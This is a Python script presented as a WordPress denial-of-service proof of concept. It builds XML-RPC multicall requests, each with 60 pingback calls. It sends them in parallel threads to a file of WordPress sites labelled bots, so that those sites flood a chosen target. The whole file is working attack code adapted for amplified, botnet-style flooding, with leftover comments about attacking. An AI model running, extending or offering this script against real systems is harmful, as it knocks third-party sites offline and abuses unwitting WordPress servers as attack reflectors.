#!/usr/bin/env python
# WordPress <= 5.3.? Denial-of-Service PoC
# Abusing pingbacks+xmlrpc multicall to exhaust connections

from urllib.parse import urlparse
import threading
import time
import sys, uuid, urllib3, requests
urllib3.disable_warnings()

DEBUG = True 
def dprint(X):
       if DEBUG: print(X)

COUNT=0
start = time.time()
count_bytes = 0

headers = {
    'Accept': '*/*',
    'Accept-Language': '*/*',
    'Cache-Control': 'max-age=0',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
    'Connection': 'keep-alive',
    'Referer': 'http://www.baidu.com/'
}


def build_entry(pingback,target):
       global COUNT
       COUNT +=1
       entry  = "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member>"
       entry += f"<name>params</name><value><array><data><value>{pingback}/{COUNT}</value>"
       #entry += f"<name>params</name><value><array><data><value>{pingback}/{uuid.uuid4()}</value>"
       entry += f"<value>{target}/?p=1</value></data></array></value></member></struct></value>"
       #entry += f"<value>{target}/#e</value></data></array></value></member></struct></value>" # taxes DB more
       return entry

def build_request(pingback,target,entries):
       prefix   = "<methodCall><methodName>system.multicall</methodName><params><param><array>"
       suffix   = "</array></param></params></methodCall>"
       request  = prefix
       for _ in range(0,entries): request += build_entry(pingback,target)
       request += suffix
       return request

def usage_die():
       print(f"[!] Usage: {sys.argv[0]} <check/attack> <pingback url> <target url>")
       exit(1)
#session = requests.Session()
def UrlCheck(url,xmldata):
	try:
		resp = requests.post(url, xmldata, verify=False, headers=headers, allow_redirects=False, timeout=10)
		if resp.status_code == 200:
			lst.append([url])
			return
#			print(f"[>] Successful! {url} - ({resp.status_code})")
	except Exception as e:
		pass
lst = []
def main(pingback):
#       A = []
	threads = []
#Input your entries to build payload xml-rpc:
	entries = 60
	with open('botnetvn.txt','r') as f:
#          A = f.read().splitlines()
		urls = f.readlines()
#       for i in range(len(A)):
	number_of_bots = 0
	for url in urls:
		number_of_bots += 1
#		time.sleep(0.1)
		xmldata = build_request(pingback,url.strip('\n'),entries)
#          print("Check For ",A[i])
#          print("[+] Running in exploit mode")
#          print(f"[+] Got pingback URL \"{pingback}\"")
#		print(f"[+] Got pingback URL \"{url}\"")
		t = threading.Thread(target=UrlCheck, args=(url.strip('\n'),xmldata))
		threads.append(t)
#	print("Total bots:", number_of_bots)
#          print(f"[+] Attacking by bot URL \"{A[i]}\"")
#          print(f"[+] Building {entries} pingback calls")
#          dprint("[+] Request:\n")
#          dprint(xmldata+"\n")
#          print(f"[+] Request size: {len(xmldata)} bytes")
	for i in range(0, len(threads)):
		threads[i].start()
	for i in range(0, len(threads)):
		threads[i].join()
	end = time.time()
	timing = str(end - start)
	return(lst)
#          count_bytes += len(xmldata)
#          print(f"[>] Total bytes sended: {count_bytes}")
#	print("[+] Attacked Timing " + "~> " + str(end - start))
#if __name__ == "__main__":
#       main(pingback="http://c1euw7len3grd7142i51cazoxf35ru.burpcollaborator.net")
